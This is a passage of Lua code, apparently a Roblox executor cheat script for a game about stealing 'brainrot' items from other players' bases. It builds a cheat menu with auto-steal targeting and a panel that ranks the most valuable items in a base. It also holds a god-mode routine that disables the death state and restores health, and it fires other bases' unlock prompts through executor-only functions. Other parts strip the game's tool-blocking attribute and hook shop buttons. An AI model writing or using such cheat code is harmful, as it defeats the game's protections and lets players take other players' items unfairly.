				local frame6 = Instance.new("Frame")
				frame6.BackgroundTransparency = 1
				frame6.Position = UDim2.fromOffset(10, 40)
				frame6.Size = UDim2.new(1, -20, 0, (n17 + 4) * (n14 + 1))
				frame6.Parent = frame4
				local uiListLayout = Instance.new("UIListLayout")
				uiListLayout.FillDirection = Enum.FillDirection.Vertical
				uiListLayout.Padding = UDim.new(0, 4)
				uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
				uiListLayout.Parent = frame6
				value89 = frame6
				flag73 = frame6
				local textLabel7 = Instance.new("TextLabel")
				textLabel7.BackgroundTransparency = 1
				textLabel7.LayoutOrder = 99
				textLabel7.Size = UDim2.new(1, 0, 0, 22)
				textLabel7.Text = ""
				textLabel7.TextColor3 = Color3.fromRGB(140, 140, 150)
				textLabel7.TextScaled = true
				textLabel7.Visible = false
				func75(textLabel7)
				textLabel7.Parent = frame6
				value91 = textLabel7
				table.clear(tbl30)

				for i_ = 1, n14 + 1 do
					tbl30[i_] = func84(i_)
				end
			end

			local function func88(list11, param27, param28, str12, param29)
				local modelKey = tostring(param29) .. "|" .. str12
				if list11.ModelKey == modelKey and list11.Clone and list11.Clone.Parent then
					return
				end

				for _, child in ipairs(list11.Viewport:GetChildren()) do
					if not child:IsA("Camera") then
						child:Destroy()
					end
				end

				list11.Clone = nil
				list11.Track = nil
				list11.SourceTrack = nil
				if str12 == "" then
					list11.ModelKey = modelKey
					return
				end
				local obj29 = func80(param27, param28, str12)
				if not obj29 then
					list11.ModelKey = nil
					return
				end
				list11.ModelKey = modelKey

				local ok, clone = pcall(function()
					return obj29:Clone()
				end)

				if not ok or not clone then
					list11.ModelKey = nil
					return
				end

				for _, descendant in ipairs(clone:GetDescendants()) do
					if descendant:IsA("ParticleEmitter") or descendant:IsA("Beam") or descendant:IsA("Trail") or descendant:IsA("Light") or descendant:IsA("Sound") or descendant:IsA("Script") or descendant:IsA("LocalScript") then
						descendant:Destroy()
					end
				end

				local worldModel = Instance.new("WorldModel")
				worldModel.Parent = list11.Viewport
				clone.Parent = worldModel

				pcall(function()
					clone:PivotTo(CFrame.new())
				end)

				local ok2, result, result2 = pcall(function()
					return clone:GetBoundingBox()
				end)

				local value106 = ok2 and result2
				local n24 = 4

				if value106 then
					n24 = math.max(result2.X, result2.Y, result2.Z)
				end

				local n25 = math.max(n24 * 1.05, 3)
				ok2 = ok2 and result.Position or Vector3.zero
				list11.Camera.CFrame = CFrame.lookAt(ok2 + Vector3.new(n25 * 0.28, n25 * 0.08, -n25), ok2, Vector3.new(0, 1, 0))
				list11.Clone = clone
				local humanoid = obj29:FindFirstChildWhichIsA("Humanoid") or obj29:FindFirstChildWhichIsA("AnimationController")
				humanoid = humanoid and humanoid:FindFirstChildOfClass("Animator")
				local humanoid2 = clone:FindFirstChildWhichIsA("Humanoid") or clone:FindFirstChildWhichIsA("AnimationController")
				humanoid2 = humanoid2 and humanoid2:FindFirstChildOfClass("Animator")
				if not (humanoid and humanoid2) then
					return
				end
				local playingAnimationTracks = humanoid:GetPlayingAnimationTracks()
				playingAnimationTracks = playingAnimationTracks and playingAnimationTracks[1]
				if not playingAnimationTracks or not playingAnimationTracks.Animation then
					return
				end
				local animation = Instance.new("Animation")
				animation.AnimationId = playingAnimationTracks.Animation.AnimationId

				local ok3, track = pcall(function()
					return humanoid2:LoadAnimation(animation)
				end)

				if ok3 and track then
					pcall(function()
						track.Looped = true
						track:Play(0)
						track.TimePosition = playingAnimationTracks.TimePosition
						track:AdjustSpeed(playingAnimationTracks.Speed)
					end)

					list11.Track = track
					list11.SourceTrack = playingAnimationTracks
				end
			end

			local function func89()
				for _, item18 in ipairs(tbl30) do
					local track = item18.Track
					local sourceTrack = item18.SourceTrack

					if track and sourceTrack and item18.Row.Visible then
						if not pcall(function()
							if not track.IsPlaying then
								track:Play(0)
							end

							if math.abs(track.TimePosition - sourceTrack.TimePosition) > 0.2 then
								track.TimePosition = sourceTrack.TimePosition
							end
						end) then
							item18.Track = nil
							item18.SourceTrack = nil
						end
					end
				end
			end

			local function func90(list12, instance9)
				for _, child in ipairs(list12.TraitHolder:GetChildren()) do
					if child:IsA("ImageLabel") then
						child:Destroy()
					end
				end

				instance9 = instance9 and instance9:FindFirstChild("Traits")
				if not instance9 then
					return
				end
				local layoutOrder = 0

				for _, child in ipairs(instance9:GetChildren()) do
					if child:IsA("ImageLabel") and child.Visible and child.Image ~= "" and layoutOrder < 3 then
						layoutOrder += 1
						local imageLabel = Instance.new("ImageLabel")
						imageLabel.BackgroundTransparency = 1
						imageLabel.Image = child.Image
						imageLabel.LayoutOrder = layoutOrder
						imageLabel.Size = UDim2.fromOffset(12, 12)
						imageLabel.Parent = list12.TraitHolder
					end
				end
			end

			local function func91()
				if not flag75 then
					if screenGui3 then
						func74()
					end

					return
				end

				local now = os.clock()
				if now - n21 < n15 then
					return
				end
				n21 = now
				local character_ = localPlayer.Character
				character_ = character_ and character_:FindFirstChild("HumanoidRootPart")
				if not character_ then
					func74()
					return
				end
				func85()
				func9(false)
				local value107 = nil
				local plot = nil

				for _, item19 in ipairs(tbl3) do
					if item19.Prompt.Parent then
						local magnitude = (character_.Position - item19.Spawn.Position).Magnitude

						if magnitude <= n13 and (not value107 or magnitude < value107) then
							plot = item19.Plot
							value107 = magnitude
						end
					end
				end

				if plot then
					value94 = plot
					n22 = now
				elseif value94 and value94.Parent and now - n22 < 3 then
					plot = value94
				end

				local list13 = {}

				if plot then
					for _, item20 in ipairs(tbl3) do
						local prompt3 = item20.Prompt
						local parent = item20.Plot == plot and prompt3.Parent

						if parent then
							parent = tostring(prompt3.ObjectText or "") ~= ""
						end

						if parent then
							list13[#list13 + 1] = {
								Podium = item20,
								Distance = (character_.Position - item20.Spawn.Position).Magnitude,
								Generation = item20.Generation or 0,
							}
						end
					end
				end

				local value108 = nil

				for _, item21 in ipairs(list13) do
					if not value108 or item21.Distance < value108.Distance then
						value108 = item21
					end
				end

				table.sort(list13, function(param30, param31)
					return param30.Generation > param31.Generation
				end)

				local list14 = {}

				if value108 then
					list14[#list14 + 1] = { Data = value108, Rank = 0 }
				end

				for i_ = 1, math.min(n19, #list13) do
					list14[#list14 + 1] = { Data = list13[i_], Rank = i_ }
				end

				local str13 = tostring(prompt2)

				for _, item22 in ipairs(list14) do
					str13 ..= "|" .. tostring(item22.Data.Podium.Prompt) .. ":" .. tostring(item22.Rank)
				end

				local flag81 = str13 ~= str10
				str10 = str13

				if value90 then
					value90.Text = plot and string.format("%d brainrot here", #list13) or "walk into a base"
				end

				n23 = #list14
				value96 = plot
				func78()
				if flag74 then
					return
				end

				for i_, item23 in ipairs(tbl30) do
					local entry8 = list14[i_]

					if not entry8 then
						item23.Row.Visible = false
						item23.Prompt = nil
						item23.RowKey = nil
						item23.Clone = nil
						item23.Track = nil
						item23.SourceTrack = nil
					else
						local podium = entry8.Data.Podium
						local text = tostring(podium.Prompt.ObjectText or "")
						item23.Row.Visible = true
						item23.Prompt = podium.Prompt
						item23.RowKey = tostring(podium.Prompt) .. ":" .. tostring(entry8.Rank)

						if entry8.Rank == 0 then
							item23.Rank.Text = "NEAR"
							item23.Rank.TextColor3 = Color3.fromRGB(125, 205, 255)
						else
							item23.Rank.Text = "#" .. entry8.Rank
							item23.Rank.TextColor3 = Color3.fromRGB(255, 214, 84)
						end

						item23.NameLabel.Text = text
						chilliGithubFastManualDefaultsRu.ApplyBrainrotNameStyle(item23.NameStyle, entry8.Data.Generation)
						item23.ValueLabel.Text = func8(entry8.Data.Generation)

						if flag81 then
							local spawn2 = func79(podium.Spawn, text)
							local mutation = spawn2 and spawn2:FindFirstChild("Mutation")

							if mutation and mutation:IsA("TextLabel") and mutation.Visible and tostring(mutation.Text) ~= "" then
								item23.MutationLabel.Text = mutation.Text
								item23.MutationLabel.TextColor3 = mutation.TextColor3
								item23.MutationLabel.RichText = mutation.RichText
							else
								item23.MutationLabel.Text = ""
							end

							func90(item23, spawn2)
						end

						func88(item23, podium.Plot, podium.Spawn, text, podium.Prompt)
					end
				end

				func83()
			end

			func4(RunService.Heartbeat:Connect(function()
				if flag3 then
					func91()
				end
			end))

			local n24 = 0

			func4(RunService.Heartbeat:Connect(function()
				if not (flag3 and flag75 and screenGui3) then
					return
				end
				local now = os.clock()
				if now < n24 then
					return
				end
				n24 = now + 0.25
				func89()
			end))

			obj17:CreateToggle({
				Name = "Show Auto Steal Bar",
				Note = "Shows the current Auto Steal target and hold progress.",
				Default = true,
				Quick = false,
				SubOf = obj26,
				Callback = function(value)
					flag6 = value == true
					func56()
				end,
			})

			obj17:CreateToggle({
				Name = "Show Distance Meter",
				Note = "Adds a live distance row to the bar, measured against Auto Steal Distance.",
				Default = false,
				Quick = false,
				SubOf = obj26,
				Callback = function(value)
					func53(value == true)
				end,
			})

			obj17:CreateSlider({
				Name = "Base Panel Size",
				Note = "Scales the Base Target Panel.",
				Min = 60,
				Max = 160,
				Default = 85,
				AllowDecimals = false,
				Increment = 1,
				Unit = "%",
				Quick = false,
				Callback = function(value)
					n20 = math.clamp((tonumber(value) or 100) / 100, 0.6, 1.6)

					if func73 then
						func73()
					end
				end,
			})

			local value109 = obj17:CreateToggle({
				Name = "Base Target Panel",
				Note = "Lists the nearest and highest Brainrots in this base; pick one to take it first.",
				Default = true,
				Quick = false,
				Callback = function(value)
					flag75 = value == true

					if not flag75 then
						func74()
					end
				end,
			})

			obj17:CreateDropdown({
				Name = "Base Target Count",
				Options = { "1", "2", "3", "4", "5" },
				Default = "3",
				Quick = false,
				SubOf = value109,
				Callback = function(value)
					local n25 = math.clamp(math.floor(tonumber(value) or 5), 1, 5)
					if n19 == n25 then
						return
					end
					n19 = n25
					str10 = ""
					n21 = -math.huge

					if flag75 then
						func91()
					end
				end,
			})

			obj17:CreateButton({
				Name = "Pick Nearest Target",
				ButtonText = "Pick",
				Note = "Targets the closest Brainrot; bind a key to it for one-press picking.",
				Quick = false,
				SubOf = value109,
				Callback = function()
					local character_ = localPlayer.Character
					character_ = character_ and character_:FindFirstChild("HumanoidRootPart")
					if not character_ then
						return
					end
					func9(false)
					local value110 = nil
					local value111 = nil

					for _, item24 in ipairs(tbl3) do
						local prompt3 = item24.Prompt
						local parent = prompt3.Parent

						if parent then
							parent = tostring(prompt3.ObjectText or "") ~= ""
						end

						if parent then
							local magnitude = (character_.Position - item24.Spawn.Position).Magnitude

							if not value110 or magnitude < value110 then
								value110 = magnitude
								value111 = item24
							end
						end
					end

					if not value111 then
						return
					end
					prompt2 = value111.Prompt
					str11 = tostring(value111.Prompt.ObjectText or "")
					func66()
					str10 = ""
					func83()
				end,
			})

			obj17:CreateButton({
				Name = "Clear Picked Target",
				ButtonText = "Clear",
				Note = "Drops the picked Brainrot and returns to Nearest or Highest.",
				Quick = false,
				SubOf = value109,
				Callback = function()
					prompt2 = nil
					str11 = ""
					str10 = ""
					func83()
				end,
			})
		end

		do
			local n22 = 0.05
			local n23 = 22
			local n24 = 9
			local value112 = nil
			local n25 = -math.huge
			local n26 = 0
			local flag82 = false
			local value113 = nil

			func4(RunService.RenderStepped:Connect(function(deltaTime)
				if flag3 and flag4 then
					func52(deltaTime)
				elseif obj24 then
					func51()
				end

				if not flag3 or not flag4 or not flag6 then
					value112 = nil
					return
				end
				local now = os.clock()

				if now - n25 >= n22 then
					n25 = now
					local str14, str15, generation

					if flag8 or localPlayer:GetAttribute("Stealing") == true then
						n26 = 0
						str14 = "GET READY - carrying brainrot"
						str15 = ""
						generation = nil
					else
						local character_ = localPlayer.Character
						character_ = character_ and character_:FindFirstChild("HumanoidRootPart")

						if character_ then
							local value114, flag83

							if flag5 then
								local value115, value116, value117
								value115, value116, value114, value117, flag83 = func18(character_)
							else
								local value118, flag84, value119, value120
								value118, flag84, value119, value120, flag83 = func18(character_)
								value114 = func11(character_) or flag84 or value120
							end

							if value114 then
								str14 = value114.Name
								str15 = func8(value114.Generation)
								generation = value114.Generation
								local n27 = math.max(tonumber(n3) or 20, 1)
								n26 = 1 - math.clamp(value114.Distance / n27, 0, 1)

								if visible then
									str14 = string.format("%s   %.0f/%d", value114.Name, value114.Distance, n27)
								end

								local n28 = 10

								pcall(function()
									n28 = value114.Prompt.MaxActivationDistance
								end)

								flag82 = value114.Distance <= n28
							else
								str14 = flag83 == 0 and "no steal prompts" or ""
								n26 = 0
								flag82 = false
								str15 = ""
								generation = nil
							end
						else
							n26 = 0
							flag82 = false
							str14 = ""
							str15 = ""
							generation = nil
						end
					end

					local str16 = tostring(str14) .. "\0" .. tostring(str15)

					if str16 ~= value112 then
						value112 = str16
						func55(str14, str15, generation)
					end
				end

				if flag41 and localPlayer:GetAttribute("Stealing") == true then
					flag41 = false
				end

				local n27 = 0

				if flag41 then
					n27 = math.clamp((now - n8) / n9, 0, 1)
				end

				local n28 = math.min(deltaTime or 0.016, 0.1)
				n10 += (n27 - n10) * (1 - math.exp(-n28 * n23))

				if n27 <= 0 and n10 < 0.002 then
					n10 = 0
				end

				frame2.Size = UDim2.new(n10, 0, 1, 0)

				if visible then
					n11 += (n26 - n11) * (1 - math.exp(-n28 * n24))
					frame3.Size = UDim2.new(n11, 0, 1, 0)

					if flag82 ~= value113 then
						value113 = flag82
						frame3.BackgroundTransparency = flag82 and 0.35 or 0.62
					end
				end
			end))
		end

		local function func92()
			if not flag3 then
				return
			end
			flag3 = false
			flag4 = false
			flag8 = false
			n5 += 1
			func49()
			func6()
			func51()
			func74()
			func69()

			if screenGui2 then
				pcall(function()
					screenGui2:Destroy()
				end)
			end

			if screenGui then
				pcall(function()
					screenGui:Destroy()
				end)
			end
		end

		bindableEvent.Event:Connect(func92)
		folder.Destroying:Connect(func92)

		do
			local flag85 = true
			local flag86 = false
			local n22 = 0
			local connection2 = nil
			local chilliDropBrainrotRuntime = CoreGui:FindFirstChild("__ChilliDropBrainrotRuntime")

			if chilliDropBrainrotRuntime then
				local cleanup = chilliDropBrainrotRuntime:FindFirstChild("Cleanup")

				if cleanup and cleanup:IsA("BindableEvent") then
					pcall(function()
						cleanup:Fire()
					end)
				end

				pcall(function()
					chilliDropBrainrotRuntime:Destroy()
				end)
			end

			local folder2 = Instance.new("Folder")
			folder2.Name = "__ChilliDropBrainrotRuntime"
			folder2.Archivable = false
			folder2.Parent = CoreGui
			local bindableEvent2 = Instance.new("BindableEvent")
			bindableEvent2.Name = "Cleanup"
			bindableEvent2.Parent = folder2

			local function func93(flag87)
				localPlayer:SetAttribute("ChilliDropBrainrotActive", flag87 == true)
			end

			local function func94(flag88, param32)
				return flag85 and flag88 == n22 and localPlayer.Character == param32
			end

			local function callback3()
				if flag86 or localPlayer:GetAttribute("Stealing") ~= true then
					return
				end
				local character_ = localPlayer.Character
				local humanoid = character_ and character_:FindFirstChildOfClass("Humanoid")
				local humanoidRootPart = character_ and character_:FindFirstChild("HumanoidRootPart")
				if not humanoid or not humanoidRootPart then
					return
				end
				n22 += 1
				local flag89 = n22
				flag86 = true
				func93(true)

				task.spawn(function()
					local cFrame = humanoidRootPart.CFrame
					local assemblyLinearVelocity = humanoidRootPart.AssemblyLinearVelocity
					local health = humanoid.Health
					local breakJointsOnDeath = humanoid.BreakJointsOnDeath
					local requiresNeck = humanoid.RequiresNeck
					local flag90 = true

					pcall(function()
						flag90 = humanoid:GetStateEnabled(Enum.HumanoidStateType.Dead)
						humanoid.BreakJointsOnDeath = false
						humanoid.RequiresNeck = false
						humanoid:SetStateEnabled(Enum.HumanoidStateType.Dead, false)
					end)

					local connection3 = humanoid.HealthChanged:Connect(function(health2)
						if func94(flag89, character_) and health2 <= 0 then
							pcall(function()
								humanoid.Health = math.max(humanoid.MaxHealth, health, 1)
							end)
						end
					end)

					pcall(function()
						local now = os.clock()

						while func94(flag89, character_) and humanoidRootPart.Parent and humanoid.Parent and os.clock() - now < 0.35 do
							if humanoid.Health <= 0 then
								humanoid.Health = math.max(humanoid.MaxHealth, health, 1)
							end

							humanoidRootPart.AssemblyLinearVelocity = Vector3.new(0, 1000, 0)
							humanoidRootPart.CFrame = cFrame
							task.wait()
						end

						if func94(flag89, character_) and humanoidRootPart.Parent then
							humanoidRootPart.CFrame = cFrame
							humanoidRootPart.AssemblyLinearVelocity = assemblyLinearVelocity
						end

						local now2 = os.clock()

						while func94(flag89, character_) and humanoid.Parent and localPlayer:GetAttribute("Stealing") == true and os.clock() - now2 < 1.5 do
							if humanoid.Health <= 0 then
								humanoid.Health = math.max(humanoid.MaxHealth, health, 1)
							end

							task.wait()
						end
					end)

					if connection3 then
						connection3:Disconnect()
					end

					if localPlayer.Character == character_ and humanoid.Parent then
						pcall(function()
							humanoid.BreakJointsOnDeath = breakJointsOnDeath
							humanoid.RequiresNeck = requiresNeck
							humanoid:SetStateEnabled(Enum.HumanoidStateType.Dead, flag90)

							if health > 0 and humanoid.Health <= 0 then
								humanoid.Health = health
							end
						end)
					end

					if flag89 == n22 then
						flag86 = false

						if flag85 then
							func93(false)
						end
					end
				end)
			end

			local function func95()
				if not flag85 then
					return
				end
				flag85 = false
				n22 += 1
				flag86 = false
				func93(false)

				if connection2 then
					connection2:Disconnect()
					connection2 = nil
				end
			end

			func93(false)

			connection2 = localPlayer.CharacterAdded:Connect(function()
				n22 += 1
				flag86 = false
				func93(false)
			end)

			bindableEvent2.Event:Connect(func95)
			folder2.Destroying:Connect(func95)
			obj17:CreateButton({ Name = "Drop Brainrot", ButtonText = "Drop", Callback = callback3 })
		end

		obj15 = Helper:CreateSection({ Name = "Helper", Expanded = true })
		obj16 = Helper:CreateSection({ Name = "Aimbot", Expanded = true })
		obj10 = Helper:CreateSection({ Name = "Movement & Combat", Expanded = true })
		local obj30
		obj30 = Helper:CreateSection({ Name = "Unlock Base", Expanded = true })
		local flag91
		flag91 = false
		local folder2

		do
			local obj31 = CoreGui

			pcall(function()
				if type(gethui) == "function" then
					local hui = gethui()

					if typeof(hui) == "Instance" then
						obj31 = hui
					end
				end
			end)

			local chilliUnlockBaseRuntime = obj31:FindFirstChild("__ChilliUnlockBaseRuntime")

			if chilliUnlockBaseRuntime then
				local cleanup = chilliUnlockBaseRuntime:FindFirstChild("Cleanup")

				if cleanup and cleanup:IsA("BindableEvent") then
					pcall(function()
						cleanup:Fire()
					end)
				end

				pcall(function()
					chilliUnlockBaseRuntime:Destroy()
				end)
			end

			folder2 = Instance.new("Folder")
			folder2.Name = "__ChilliUnlockBaseRuntime"
			folder2.Archivable = false
			folder2.Parent = obj31
		end

		do
			local bindableEvent2 = Instance.new("BindableEvent")
			bindableEvent2.Name = "Cleanup"
			bindableEvent2.Parent = folder2

			local function func96()
				local character_ = localPlayer.Character
				if not character_ then
					return nil
				end
				return character_:FindFirstChild("HumanoidRootPart") or character_:FindFirstChild("UpperTorso")
			end

			local function func97()
				return Workspace:FindFirstChild("Plots")
			end

			local function func98(param33, num9)
				local n22 = param33.X - num9.X
				local n23 = param33.Z - num9.Z
				return math.sqrt(n22 * n22 + n23 * n23)
			end

			local function func99(instance10, param34)
				local animalPodiums = instance10:FindFirstChild("AnimalPodiums")
				local huge = math.huge

				if animalPodiums then
					for _, child in ipairs(animalPodiums:GetChildren()) do
						local base = child:FindFirstChild("Base")
						base = base and base:FindFirstChild("Spawn")

						if base and base:IsA("BasePart") then
							huge = math.min(huge, func98(param34, base.Position))
						end
					end
				end

				if huge == math.huge then
					local ok, result = pcall(function()
						return instance10:GetPivot()
					end)

					if ok then
						huge = func98(param34, result.Position)
					end
				end

				return huge
			end

			local function func100()
				local result7 = func96()
				local result8 = func97()
				if not result7 or not result8 then
					return nil
				end
				local huge = math.huge
				local value121 = nil

				for _, child in ipairs(result8:GetChildren()) do
					local flag92 = func99(child, result7.Position)

					if flag92 < huge then
						huge = flag92
						value121 = child
					end
				end

				return value121
			end

			local function func101(instance11)
				local result9 = func97()

				while instance11 and instance11 ~= Workspace do
					if instance11.Parent == result9 then
						return instance11
					end
					instance11 = instance11.Parent
				end

				return nil
			end

			local function func102(instance12)
				instance12 = instance12 and instance12:FindFirstChild("AnimalPodiums")
				local list15 = {}
				if not instance12 then
					return list15
				end

				for _, child in ipairs(instance12:GetChildren()) do
					local base = child:FindFirstChild("Base")
					base = base and base:FindFirstChild("Spawn")

					if base and base:IsA("BasePart") then
						local y = base.Position.Y
						local flag93 = false

						for _, item25 in ipairs(list15) do
							if math.abs(item25 - y) < 1 then
								flag93 = true
								break
							end
						end

						if not flag93 then
							list15[#list15 + 1] = y
						end
					end
				end

				table.sort(list15)
				return list15
			end

			local function func103(instance13, instance14)
				local animalPodiums = instance14 and instance14:FindFirstChild("AnimalPodiums")

				while instance13 and instance13 ~= instance14 do
					if instance13.Parent == animalPodiums then
						local base = instance13:FindFirstChild("Base")
						base = base and base:FindFirstChild("Spawn")
						if base and base:IsA("BasePart") then
							return base.Position.Y
						end
						return nil
					end

					instance13 = instance13.Parent
				end

				return nil
			end

			local function func104(param35, obj32)
				local list16 = func102(obj32)
				local num10 = func103(param35, obj32)

				if num10 and #list16 > 0 then
					local huge = math.huge
					local n22 = 1

					for i_, item26 in ipairs(list16) do
						local n23 = math.abs(num10 - item26)

						if n23 < huge then
							huge = n23
							n22 = i_
						end
					end

					return math.clamp(n22, 1, 3)
				end

				local result10 = func96()
				if not result10 or #list16 == 0 then
					return 1
				end
				local y = list16[1]

				local ok, result = pcall(function()
					return obj32:GetPivot()
				end)

				if ok then
					y = result.Position.Y
				end

				local n22 = list16[1] - y
				local n23 = 1

				for i_ = 2, math.min(#list16, 3) do
					if list16[i_] - n22 <= result10.Position.Y then
						n23 = i_
					end
				end

				return n23
			end

			local function func105(instance15)
				instance15 = instance15 and instance15:FindFirstChild("Unlock")
				local list17 = {}
				if not instance15 then
					return list17
				end

				for _, child in ipairs(instance15:GetChildren()) do
					local position

					if child:IsA("Model") then
						local ok, result = pcall(function()
							return child:GetPivot()
						end)

						position = nil

						if ok then
							position = result.Position
						end
					else
						position = nil

						if child:IsA("BasePart") then
							position = child.Position
						end
					end

					if position then
						list17[#list17 + 1] = { Instance = child, Y = position.Y }
					end
				end

				table.sort(list17, function(param36, param37)
					return param36.Y < param37.Y
				end)

				return list17
			end

			local function func106(param38, param39)
				local value122 = fireproximityprompt
				if type(value122) ~= "function" then
					return false
				end
				local flag94 = func105(param38)[param39]
				if not flag94 then
					return false
				end
				local flag95 = false

				for _, descendant in ipairs(flag94.Instance:GetDescendants()) do
					if descendant:IsA("ProximityPrompt") then
						flag95 = pcall(value122, descendant) or flag95
					end
				end

				return flag95
			end

			local function func107(param40)
				local result11 = func100()

				if result11 then
					func106(result11, param40)
				end
			end

			local function func108(instance16)
				if not instance16 or not instance16:IsA("ProximityPrompt") then
					return false
				end
				return string.find(string.lower(tostring(instance16.ActionText or "")), "steal", 1, true) ~= nil
			end

			local connection2 = ProximityPromptService.PromptButtonHoldBegan:Connect(function(prompt3, player)
				if not flag91 or player and player ~= localPlayer or not func108(prompt3) then
					return
				end
				local flag96 = func101(prompt3) or func100()
				if not flag96 then
					return
				end
				local value123 = func104(prompt3, flag96)
				task.defer(func106, flag96, value123)
			end)

			local function func109(param41)
				param41._quickBarDefault = 4
				return param41
			end

			func109(obj30:CreateToggle({
				Name = "Auto Unlock Base",
				Note = "Unlocks the current floor when you start stealing. Requires Robux.",
				Default = false,
				Pin = true,
				QuickBar = 4,
				Callback = function(value)
					flag91 = value == true
				end,
			}))

			func109(obj30:CreateButton({
				Name = "Unlock Floor 3",
				ButtonText = "Unlock",
				Note = "Unlocks Floor 3 of the nearest base. Requires Robux.",
				Pin = true,
				QuickBar = 4,
				Callback = function()
					func107(3)
				end,
			}))

			func109(obj30:CreateButton({
				Name = "Unlock Floor 2",
				ButtonText = "Unlock",
				Note = "Unlocks Floor 2 of the nearest base. Requires Robux.",
				Pin = true,
				QuickBar = 4,
				Callback = function()
					func107(2)
				end,
			}))

			func109(obj30:CreateButton({
				Name = "Unlock Floor 1",
				ButtonText = "Unlock",
				Note = "Unlocks Floor 1 of the nearest base. Requires Robux.",
				Pin = true,
				QuickBar = 4,
				Callback = function()
					func107(1)
				end,
			}))

			local function func110()
				flag91 = false

				if connection2 then
					connection2:Disconnect()
					connection2 = nil
				end
			end

			bindableEvent2.Event:Connect(func110)
			folder2.Destroying:Connect(func110)
		end

		local chilliHelperLocalRuntime = CoreGui:FindFirstChild("__ChilliHelperLocalRuntime")

		if chilliHelperLocalRuntime then
			local cleanup = chilliHelperLocalRuntime:FindFirstChild("Cleanup")

			if cleanup and cleanup:IsA("BindableEvent") then
				pcall(function()
					cleanup:Fire()
				end)
			end

			pcall(function()
				chilliHelperLocalRuntime:Destroy()
			end)
		end

		do
			local folder3 = Instance.new("Folder")
			folder3.Name = "__ChilliHelperLocalRuntime"
			folder3.Archivable = false
			folder3.Parent = CoreGui
			local bindableEvent2 = Instance.new("BindableEvent")
			bindableEvent2.Name = "Cleanup"
			bindableEvent2.Parent = folder3
			flag1 = true
			local list18 = {}

			func2 = function(param42)
				list18[#list18 + 1] = param42
			end

			local function func111()
				if not flag1 then
					return
				end
				flag1 = false

				for _, item27 in ipairs(list18) do
					pcall(item27)
				end

				table.clear(list18)
			end

			bindableEvent2.Event:Connect(func111)
			folder3.Destroying:Connect(func111)
		end

		do
			local function func112()
				if localPlayer:GetAttribute("BlockTools") == true then
					localPlayer:SetAttribute("BlockTools", false)
				end
			end

			func112()
			local connection2 = localPlayer:GetAttributeChangedSignal("BlockTools"):Connect(func112)

			func2(function()
				if connection2 then
					connection2:Disconnect()
					connection2 = nil
				end
			end)
		end
	end

	tbl2 = { ProtectedHumanoid = nil, RescueSerial = 0 }

	do
		local n = 0.5
		local value124 = nil
		local value125 = nil
		local list19 = {}
		local flag97 = false
		local n2 = 0

		local function func113()
			for _, item28 in ipairs(list19) do
				if item28.Connected then
					item28:Disconnect()
				end
			end

			table.clear(list19)
		end

		local function func114()
			func113()
			local obj33 = value124
			local flag98 = value125
			value124 = nil
			value125 = nil
			tbl2.ProtectedHumanoid = nil
			if not obj33 or not obj33.Parent or not flag98 then
				return
			end

			pcall(function()
				obj33.BreakJointsOnDeath = flag98.BreakJointsOnDeath
				obj33.RequiresNeck = flag98.RequiresNeck
				obj33:SetStateEnabled(Enum.HumanoidStateType.Dead, flag98.DeadStateEnabled)
			end)
		end

		local function func115(instance17)
			if not instance17 or not instance17.Parent then
				return false
			end

			return pcall(function()
				instance17.BreakJointsOnDeath = false
				instance17.RequiresNeck = false
				instance17:SetStateEnabled(Enum.HumanoidStateType.Dead, false)
			end) and instance17.BreakJointsOnDeath == false and instance17.RequiresNeck == false and instance17:GetStateEnabled(Enum.HumanoidStateType.Dead) == false
		end

		local function func116(humanoid3)
			if humanoid3 ~= value124 or not humanoid3 or not humanoid3.Parent or flag97 then
				return false
			end
			local maxHealth = humanoid3.MaxHealth
			if maxHealth <= 0 then
				return false
			end

			if maxHealth == math.huge or humanoid3.Health >= maxHealth then
				return true
			end
			local flag99 = humanoid3.Health <= 0
			flag97 = true

			local ok = pcall(function()
				humanoid3.Health = maxHealth
			end)

			flag97 = false

			if ok and flag99 and humanoid3.Health > 0 then
				tbl2.RescueSerial = tbl2.RescueSerial + 1
			end

			return ok and humanoid3.Health >= maxHealth
		end

		local function func117(obj34)
			func114()
			if not flag1 or not obj34 or obj34 ~= localPlayer.Character then
				return false
			end
			local humanoid = obj34:FindFirstChildOfClass("Humanoid") or obj34:WaitForChild("Humanoid", 5)
			if not flag1 or obj34 ~= localPlayer.Character or not humanoid or not humanoid:IsA("Humanoid") then
				return false
			end
			value124 = humanoid
			tbl2.ProtectedHumanoid = humanoid

			value125 = {
				BreakJointsOnDeath = humanoid.BreakJointsOnDeath,
				RequiresNeck = humanoid.RequiresNeck,
				DeadStateEnabled = humanoid:GetStateEnabled(Enum.HumanoidStateType.Dead),
			}

			if not func115(humanoid) or not func116(humanoid) then
				func114()
				return false
			end

			list19[#list19 + 1] = humanoid.HealthChanged:Connect(function()
				func116(humanoid)
			end)

			list19[#list19 + 1] = humanoid:GetPropertyChangedSignal("MaxHealth"):Connect(function()
				func116(humanoid)
			end)

			list19[#list19 + 1] = humanoid.StateChanged:Connect(function(old, new)
				if new == Enum.HumanoidStateType.Dead then
					func115(humanoid)
					func116(humanoid)
				end
			end)

			n2 = os.clock()
			return true
		end

		local connection = localPlayer.CharacterAdded:Connect(function(character_)
			func117(character_)
		end)

		local connection2 = RunService.Heartbeat:Connect(function()
			local now = os.clock()

			if value124 and now - n2 >= n then
				n2 = now
				func115(value124)
				func116(value124)
			end
		end)

		task.spawn(function()
			func117(localPlayer.Character)
		end)

		func2(function()
			func114()

			if connection then
				connection:Disconnect()
				connection = nil
			end

			if connection2 then
				connection2:Disconnect()
				connection2 = nil
			end
		end)
	end

	local func118, func119
	local n = 2

	func118 = function(childName)
		local character_ = localPlayer.Character
		local backpack = localPlayer:FindFirstChildOfClass("Backpack")
		return character_ and character_:FindFirstChild(childName) or backpack and backpack:FindFirstChild(childName)
	end

	func119 = function(childName2)
		local value126 = func118(childName2)
		if value126 then
			return value126
		end
		local playerGui = localPlayer:FindFirstChildOfClass("PlayerGui")
		playerGui = playerGui and playerGui:FindFirstChild("CoinsShop")
		playerGui = playerGui and playerGui:FindFirstChild("CoinsShop")
		playerGui = playerGui and playerGui:FindFirstChild("Content")
		playerGui = playerGui and playerGui:FindFirstChild("Items")
		playerGui = playerGui and playerGui:FindFirstChild(childName2)
		local locked = playerGui and playerGui:FindFirstChild("Locked")
		playerGui = playerGui and playerGui:FindFirstChild("Buy")
		if locked and locked.Visible then
			return nil, "rebirth"
		end

		if not playerGui then
			return nil, "unavailable"
		end
		local ok, result = pcall(getconnections, playerGui.Activated)
		if not ok or type(result) ~= "table" then
			return nil, "unavailable"
		end
		local flag100 = false

